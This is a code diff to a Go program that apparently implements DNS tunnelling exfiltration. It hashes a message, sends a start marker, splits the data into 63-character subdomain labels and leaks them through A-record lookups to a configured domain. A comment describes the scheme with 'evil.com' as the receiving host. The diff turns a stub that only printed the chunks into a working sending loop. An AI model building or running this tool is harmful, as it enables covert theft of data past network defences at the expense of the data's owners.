@@ -8,11 +8,13 @@ import (
 	"encoding/hex"
 	"fmt"
 	"os"
-	"net")
+	"net"
+	"errors"
+)
 
 var DNSName string
 
-func resolver(domain string, qtype uint16) []dns.RR {
+func resolver(domain string, qtype uint16) error {
 	//ONLY FOR LINUX AND MACOS
 	config, _ := dns.ClientConfigFromFile("/etc/resolv.conf")
 
@@ -24,14 +26,14 @@ func resolver(domain string, qtype uint16) []dns.RR {
 
     response, _, err := c.Exchange(m, net.JoinHostPort(config.Servers[0], config.Port))
     if err != nil {
-        return nil
+        return err
     }
 
     if response == nil {
-        return nil
+        return errors.New("Response error")
     }
 
-    return response.Answer
+    return nil
 }
 
 func integrityCheck(message string)string{
@@ -40,22 +42,33 @@ func integrityCheck(message string)string{
 	return hex.EncodeToString(hash.Sum(nil))
 }
 
-func sending(message string) string{
+func sending(message string) error {
+	
+	/*
+		1. Send Init message (crc sum + hello msg)
+		2. Split data on chunks (subdomain - 63 characters) -->  RFC 1035
+		3. result = [{1}, {2}, {3}, ..., {n}]
+			domain = Build while [{...}.{2}.{1}.evil.com] < 255  -->  RFC 1035
+		4. send data using resolver(domain) func
+	*/
+
 
 	if message == "" {
-		return "empty message"
+		return errors.New("[X]Empty message")
 	}
 
 	crc := integrityCheck(message)
 	startingToken := ".ZG5zZXJjX3N0YXJ0X21lc3NhZ2Ug."
 
 	// Send Init message
-	init_resp := resolver(crc+startingToken+DNSName, dns.TypeA)
-	fmt.Println(init_resp)
+	err := resolver(crc+startingToken+DNSName, dns.TypeA)
+	if err != nil {
+		fmt.Println(err)
+	}
 	
-	// Sending data
+	// split on chunks
 	var result []string
-	lenght := 63
+	lenght := 63 
 	for len(message) > 0 {
 		if len(message) < lenght {
 			result = append(result, message)
@@ -65,9 +78,30 @@ func sending(message string) string{
 		message = message[lenght:]
 	}
 
-	fmt.Println(result)
+	// Sending data
+	domain := DNSName
+	for index, value := range result{
+		if len(value+"."+domain) + lenght < 255{
+			domain = value+"."+domain
 
-	return ""
+			// short array
+			if index == len(result)-1 {
+				err = resolver(domain, dns.TypeA)
+				if err != nil {
+					fmt.Println(err)
+				}
+				domain = DNSName
+			}
+		} else {
+			err = resolver(value+"."+domain, dns.TypeA)
+			if err != nil {
+				fmt.Println(err)
+			}
+			domain = DNSName
+		}
+	}
+
+	return nil
 }
 
 func main() {
@@ -88,7 +122,7 @@ func main() {
     }
 
 	err := sending(message)
-	if err != "" {
+	if err != nil {
 		fmt.Println("Sending error:", err)
 	}
 }
